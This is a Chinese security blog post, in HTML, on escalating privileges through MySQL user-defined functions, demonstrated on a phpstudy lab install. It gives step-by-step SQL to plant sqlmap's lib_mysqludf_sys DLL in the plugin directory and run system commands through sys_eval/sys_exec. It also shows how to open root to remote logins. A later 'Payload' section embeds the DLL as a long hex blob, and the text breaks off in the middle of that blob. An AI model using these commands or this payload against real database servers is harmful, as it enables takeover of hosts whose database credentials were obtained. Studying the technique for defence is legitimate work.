<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="MySQL UDF提权0x01 手工提权 udf简介： UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过 自定义函数 来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。 UDF官方介绍以">
<meta property="og:type" content="article">
<meta property="og:title" content="MySQL提权之UDF">
<meta property="og:url" content="https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/index.html">
<meta property="og:site_name" content="斑马Blog——进击的白帽子">
<meta property="og:description" content="MySQL UDF提权0x01 手工提权 udf简介： UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过 自定义函数 来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。 UDF官方介绍以">
<meta property="og:locale">
<meta property="og:image" content="https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080500.png">
<meta property="og:image" content="https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080501.png">
<meta property="og:image" content="https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080502.png">
<meta property="og:image" content="https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080503.png">
<meta property="og:image" content="https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080504.png">
<meta property="og:image" content="https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080505.png">
<meta property="og:image" content="https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080506.png">
<meta property="og:image" content="https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080507.png">
<meta property="og:image" content="https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080508.png">
<meta property="og:image" content="https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080509.png">
<meta property="og:image" content="https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/20220805010.png">
<meta property="og:image" content="https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/20220805011.png">
<meta property="og:image" content="https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/20220805012.png">
<meta property="og:image" content="https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/20220805013.png">
<meta property="article:published_time" content="2022-08-05T06:11:20.000Z">
<meta property="article:modified_time" content="2022-08-05T06:13:27.130Z">
<meta property="article:author" content="givemefivw">
<meta property="article:tag" content="渗透测试">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080500.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>MySQL提权之UDF</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Startseite</a></li><!--
     --><!--
       --><li><a href="/about/">Über diese Webseite</a></li><!--
     --><!--
       --><li><a href="/archives/">Artikel</a></li><!--
     --><!--
       --><li><a href="/">Projekte</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Vorheriger Beitrag" href="/2022/08/09/ICMP-tunnel-proxy-building/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Nächster Beitrag" href="/2022/06/17/Phishing%E9%92%93%E9%B1%BC%E8%AE%B0%E5%BD%95/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Zurück zum Anfang" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Beitrag teilen" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Vorheriger Beitrag</span>
      <span id="i-next" class="info" style="display:none;">Nächster Beitrag</span>
      <span id="i-top" class="info" style="display:none;">Zurück zum Anfang</span>
      <span id="i-share" class="info" style="display:none;">Beitrag teilen</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/&text=MySQL提权之UDF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/&title=MySQL提权之UDF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/&is_video=false&description=MySQL提权之UDF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=MySQL提权之UDF&body=Check out this article: https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/&title=MySQL提权之UDF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/&title=MySQL提权之UDF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/&title=MySQL提权之UDF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/&title=MySQL提权之UDF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/&name=MySQL提权之UDF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://givemefivw.github.io/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/&t=MySQL提权之UDF"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL-UDF%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text">MySQL UDF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 手工提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">提权条件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%BD%93%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0udf-dll"><span class="toc-number">1.2.1.</span> <span class="toc-text">1 当可以直接上传udf.dll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%BD%93%E4%B8%8D%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0udf-dll"><span class="toc-number">1.2.2.</span> <span class="toc-text">2 当不可以直接上传udf.dll</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%B7%A5%E5%85%B7%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 工具提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">1.4.</span> <span class="toc-text">参考资料</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        MySQL提权之UDF
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">givemefivw</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-08-05T06:11:20.000Z" itemprop="datePublished">2022-08-05</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="MySQL-UDF提权"><a href="#MySQL-UDF提权" class="headerlink" title="MySQL UDF提权"></a>MySQL UDF提权</h1><h2 id="0x01-手工提权"><a href="#0x01-手工提权" class="headerlink" title="0x01 手工提权"></a>0x01 手工提权</h2><ol>
<li><strong>udf简介：</strong><ul>
<li>UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过 自定义函数 来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</li>
<li>UDF官方介绍以及其函数定义请参考（<a target="_blank" rel="noopener" href="http://dev.mysql.com/doc/refman/5.5/en/adding-functions.html%E3%80%81https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html%EF%BC%89">http://dev.mysql.com/doc/refman/5.5/en/adding-functions.html、https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html）</a></li>
</ul>
</li>
<li><strong>udf提权原理</strong><ul>
<li>在udf.dll文件中自定义一些能够以高权限执行系统命令的函数，然后将该函数导入到mysql数据库中，通过mysql数据库去以高权限执行系统命令。</li>
</ul>
</li>
</ol>
<h2 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h2><ol>
<li>掌握mysql数据库的账户，该账户对mysql拥有insert和delete权限，以创建和删除函数（最好直接是root账户）</li>
<li>secure_file_priv&#x3D;””</li>
</ol>
<h3 id="1-当可以直接上传udf-dll"><a href="#1-当可以直接上传udf-dll" class="headerlink" title="1 当可以直接上传udf.dll"></a>1 当可以直接上传udf.dll</h3><p>Win10开启phpstudy，设置my.ini字段：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#  power by php中文网 2017  www.php.cn  官网下载最新版</span><br><span class="line"></span><br><span class="line">[client]</span><br><span class="line">port=3306</span><br><span class="line">[mysql]</span><br><span class="line">default-character-set=utf8</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">local_infile=1</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">secure_file_priv=&quot;&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>一个问题需要注意，mysql默认绑定了localhost，也就是只有localhost可以连接mysql，这时候无法通过远程命令进行连接，需要通过以下操作解除localhost限制：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1、连接服务器: mysql -u root -p</span><br><span class="line"></span><br><span class="line">2、看当前所有数据库：show databases;</span><br><span class="line"></span><br><span class="line">3、进入mysql数据库：use mysql;</span><br><span class="line"></span><br><span class="line">4、查看mysql数据库中所有的表：show tables;</span><br><span class="line"></span><br><span class="line">5、查看user表中的数据：select Host, User,Password from user;</span><br><span class="line"></span><br><span class="line">6、修改user表中的Host:update user set Host=&#x27;%&#x27; where User=&#x27;root&#x27;;</span><br><span class="line"></span><br><span class="line">7、最后刷新一下：flush privileges;</span><br></pre></td></tr></table></figure>

<p>假设通过某种方式获mysql数据库口令,远程登录mysql服务</p>
<p>查看mysql版本，select version();：</p>
<p><img src="/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080500.png" alt="Untitled"></p>
<ul>
<li>在mysql版本 &gt; 5.1 时，需要把udf.dll文件写入到 mysql安装目录下的 lib\plugin文件夹下</li>
<li>在mysql版本 &lt; 5.1 时，需要把udf.dll文件写入到 “win2003的：c:\windows\system32下” 或 “win2000的：c:\winnt\system32下”</li>
</ul>
<p>查看mysql数据库的位数，show variables like “%version_%;”</p>
<p><img src="/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080501.png" alt="Untitled"></p>
<ul>
<li>version_complie_os的值为：win32，说明该mysql的版本为32位的。</li>
<li>之所以要看mysql的位数，是因为要保持udf.dll文件的位数与当前数据库位数相同(注意是数据库的位数而不是操作系统的位数**)**，否则在创建函数的时候是报错：ERROR 1126 (HY000): Can’t open shared library ‘lib_mysqludf_sys.dll’ (errno: 193 )</li>
</ul>
<p>查看secure_file_priv的值，show variables like “secure_file_priv”;</p>
<p><img src="/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080502.png" alt="Untitled"></p>
<ul>
<li>当 secure_file_priv&#x3D;NULL 时，是不允许mysql导出文件的当 secure_file_priv&#x3D;xxx 时，是只允许mysql将文件导出到xxx目录下的当 secure_file_priv&#x3D; 时，mysql可以将文件导出到任意目录下该参数在 my.ini 文件中。如要修改，只能通过my.ini文件修改，然后重启mysql。不能够通过sql语句进行修改。</li>
<li>注意：<ul>
<li>在mysql5.5之前 secure_file_priv默认是空，这个情况下可以向任意绝对路径写文件</li>
<li>在mysql5.5之后 secure_file_priv默认是NULL，这个情况下不可以写文件</li>
</ul>
</li>
</ul>
<p>上传udf.dll文件，可通过sqlmap带的udf.dll</p>
<p>sqlmap\data\udf\mysql\windows\32\lib_mysqludf_sys.dll_</p>
<p>通过sqlmap&#x2F;extra&#x2F;cloak&#x2F;cloak.py -d -i lib_mysqludf_sys.dll_ 进行解码</p>
<p><img src="/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080503.png" alt="Untitled"></p>
<p>上传udf.dll</p>
<p><img src="/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080504.png" alt="Untitled"></p>
<p>接着令mysql读入udf.dll文件数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_tmp(data longblob);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_tmp <span class="keyword">values</span>(load_file(<span class="string">&#x27;C:\\phpstudy\\PHPTutorial\\MySQL\\lib\\lib_udf.dll&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t_tmp <span class="keyword">into</span> dumpfile <span class="string">&#x27;C:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval retuens string soname <span class="string">&#x27;udf.dll&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> mysql.func;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080505.png" alt="Untitled"></p>
<p><img src="/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080506.png" alt="Untitled"></p>
<p>一个问题，发现通过sys_exec执行命令，无法得到回显，通过写文件的方式进行结果获取：</p>
<p>select sys_exec(‘whoami &gt; C:\phpstudy\PHPTutorial\MySQL\lib\plugin\12.txt’);</p>
<p><img src="/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080507.png" alt="Untitled"></p>
<p>sys_eval函数可以直接回显：</p>
<p><img src="/2022/08/05/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF/2022080508.png" alt="Untitled"></p>
<p>清理危险函数：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> sys_exec<span class="operator">/</span>eval;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> t_tmp;</span><br></pre></td></tr></table></figure>

<p>思路命令总结：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> version();</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查看版本</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> &quot;%version_%&quot;;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查看位数</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查看secure_file_priv选项</span><br><span class="line"></span><br><span class="line">然后上传udf.dll文件</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_tmp(data longblob);</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>创建临时表</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_tmp <span class="keyword">values</span>(load_file(<span class="string">&#x27;C:\\phpstudy\\PHPTutorial\\MySQL\\lib\\lib_udf.dll&#x27;</span>));</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>将udf.dll文件中的二进制数据导入到该临时表中</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> &quot;%plugin%&quot;</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@plugin</span>_dir; <span class="comment">-- 该语句也可以达到相同效果</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查询mysql的plugin目录所在位置,如果没有plugin目录手动创建</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t_tmp <span class="keyword">into</span> dumpfile <span class="string">&#x27;C:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&#x27;</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>将t_tmp表中的数据导出到plugin目录下udf.dll</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname <span class="string">&#x27;udf.dll&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>创建eval函数</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> mysql.func;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查看函数是否创建成功</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>执行系统命令</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> sys_exec<span class="operator">/</span>eval;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>删除创建的函数</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> t_tmp;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>删除临时表</span><br></pre></td></tr></table></figure>

<h3 id="2-当不可以直接上传udf-dll"><a href="#2-当不可以直接上传udf-dll" class="headerlink" title="2 当不可以直接上传udf.dll"></a>2 当不可以直接上传udf.dll</h3><p>Payload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_tmp(data LONGBLOB);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_tmp <span class="keyword">values</span>(&quot;&quot;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">update</span> t_tmp <span class="keyword">set</span> data<span class="operator">=</span>concat(<span class="string">&#x27;&#x27;</span>,<span class="number">0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000F80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000004D477BD0092615830926158309261583005E86830B261583005E808308261583005E968307261583005E91830B2615832EE06E830A2615830926148325261583005E9C8308261583005E878308261583005E8483082615835269636809261583000000000000000000000000000000000000000000000000504500004C0103004AFE9F5A0000000000000000E00002210B010900001000000010000000600000607C0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007C83000008020000B4820000C800000000800000B402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002C7E00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000E0555058310000000000100000007000000010000000040000000000000000000000000000400000E02E7273726300000000100000008000000006000000140000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D090208B92BCF11B11CEEA24F550000560C000000220000260000A8FFFFFFFF8B4C240833C03901741656578B7C24146A0C59BE000010DCF3A566A55FB0015E5DFB77FBC38B44240C1A6A071611108BF8183218FF63DB6F1CA45FC7011E1200210883380175128B40040DF6776F0700750A1004C6000132C0C3530ABF1DF68D3C3053A454082D08FF30FF15FFF6EE776C885985C075085614C601011BC8568D71018A11FD6FDFFE4184D275F98B54142BCE890A32558BEC8B4D0C833902B7D860BF5374148B7D10915C5453EB4CBF9DBDDF8B417D740F1B707C1BEBE5836004DBB1FFB7001A0C8B48048B008D4401025072A0594C08DFC8D7B5891678113006A44CEB6C57BEB7B2B85F5E5DA30421740833DBB63FF6A8591353568B742410D878534602DB85DB5BB6460851C78D5C4257E8240B75EEEEBFE01400C604070008FF70041E0553B1DB1B921A22C418535720030054090F09B7086A995B0F98599954CF2D343713B8F4540B1EDEB60D818403552251519D35DFFED6FEDF576800F762D66A018945FC068BF08B4560DD7FF70CC606004533FF595939387471683CC071C6FEDFDA9C12260C3BC7745B506A04FF75FC149073E1EDD7A9FD48533AFC8D48911040B963DBFF2BC18BD88D043B505630F8268C5330D8AD8DBD5F03FE570E940DE57DF8463FE6364C2066BA5B1810A4803E0059169EB0FF741A8BC6C64437FF00594D1489C906987BEBD86F183E5F205EC9C3EED7B235DCBAF37D574708C45030087BDBDACDC9C26A4078C710548D4601B9E07E614251724F0856FF31CF6BAFDD9DB694C66AFF8DC32082F63A58B0B6030D092C23005F7CC36E57036C6A081D1290AC0AA88365FC2F6C2F2C2D4592D0EB071B408F65E8C70BBFD66E42FEFF000D1FEDC25E3BFFDB17B60D08209A02F3C3E90806F58BFF56688000002D8C6D675880985608845AA3BDE0FEBB062358045485F675054DAA83260076FBB7DB4508C36F08ED09ACC704240607FF0B4C113637598D71FFCF9C0BBF77DFC9750E39056B107E3CFF7310830B01FBEEC6BB8B0910548B098F57890A23480F85D47D618CBBAD641718068B79040838071B76EDEEBB1E50EB184AA705B8E61768B0B030D8E803A83C0957C1D6BBAEB5D6A1E7E9E2573CA12F4C6A6FF777C3025EFD096A1FEE76EB3CAA10C80475ED7BEFC0C7051F281A70E027071BDFF79D5CB520BC04B81B6A5635B952EB782B7339B2E3696FF7DEFD7340393D155C741C68062809AC43DB6B85850D9E1034252316FFE666F862F154B201DC0801592CC2B1A1DB78049DDFDBF62413D90FD4FC83F80266B16F6CB0D2595BFFA0584B77783BB5783106350F8487C71996EE4CD3543BF81810897D82EFC796BE35FAC87251833F8AF36A7C398587B4F10774E9FFC8D60F7C89C5DB9BB5D955F85615441B474DED5BE38EF88A394D1003D00874B48909437AA36D020C1AD3F8EBA71C3162CC5A64442E386161FB0A58064C32FC19503F1BDF720443375BC9C20CC710FB02231FB2288B2EF28B5D081CAE0FDB9B54E433C95CFC7D2008016C2DC6C23BF15A393A4417E4D61BFE7FAFAE3BF0740583FE02752E1910D03BC1E7166EB8ED57565FD03B5EE40003937B703B67115A039614168012376C7D270A8227FEA0246420575062B30D661327002F527F8DF61AD2061153F76A037543B067BB614F34032168742E2C0D2C3CEC257FEB1B71EC5A09706A7C6FAAE05051597C64825D900EADF62FFA8A19066B8F91B6C72AE490C396EC1640E134A9FF3B246ABB41C1F17926547DBC550C0D381E33BC05BC595D382281EC2832F7869F365F212043211C895E2118891D05F78EC243143C21A2AA